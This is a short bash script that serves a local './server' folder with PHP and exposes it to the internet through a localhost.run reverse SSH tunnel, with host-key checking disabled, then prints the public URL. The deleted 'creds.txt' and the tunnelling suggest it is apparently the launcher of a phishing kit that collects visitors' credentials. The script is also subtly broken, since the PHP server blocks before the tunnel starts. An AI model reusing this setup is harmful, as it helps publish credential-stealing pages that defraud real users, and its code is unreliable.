#!/bin/bash
killall -9 ssh && killall -2 php
rm link
rm ./server/creds.txt
php -S localhost:36360 -t ./server
sh -c "ssh -o StrictHostKeyChecking=no -R 80:localhost:36360 nokey@localhost.run 2>/dev/null 1> link" &
sleep 8
grep -o "https://[0-9a-z]*\.localhost.run" link
